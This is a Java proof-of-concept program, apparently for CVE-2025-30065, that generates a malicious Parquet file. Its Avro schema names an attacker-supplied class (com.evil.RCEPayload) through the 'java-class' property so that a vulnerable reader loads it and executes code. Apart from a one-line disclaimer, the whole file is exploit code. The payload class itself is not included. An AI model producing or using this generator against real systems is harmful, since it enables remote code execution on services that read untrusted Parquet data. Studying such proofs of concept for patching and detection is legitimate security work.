// DISCLAIMER: For authorized security research only.

package com.evil;

import org.apache.avro.Schema;
import org.apache.avro.generic.GenericData;
import org.apache.avro.generic.GenericRecord;
import org.apache.parquet.avro.AvroParquetWriter;
import org.apache.parquet.hadoop.ParquetWriter;
import org.apache.hadoop.fs.Path;


public class GenerateMaliciousParquet {
    private static final String MALICIOUS_PARQUET_DEST = "exploit.parquet";

    public static void main(String[] args) throws Exception {

        String schemaJson = """
              {
              "type": "record",
              "name":  "MaliciousRecord",
              "fields" : [
                {
                    "name": "evil",
                    "type": {
                        "type": "string",
                        "java-class": "com.evil.RCEPayload"
                    }
                }
              ]
              
              }
                """;

        Schema schema = new Schema.Parser().parse(schemaJson);
        GenericRecord record = new GenericData.Record(schema);
        record.put("evil", "whatever");

        Path path = new Path(MALICIOUS_PARQUET_DEST);
        ParquetWriter<GenericRecord> writer = AvroParquetWriter.<GenericRecord>builder(path)
                .withSchema(schema)
                .build();

        writer.write(record);
        writer.close();

        System.out.println("CVE-2025-30065 Poc: malicious parquet generated->" + MALICIOUS_PARQUET_DEST);
    }
}
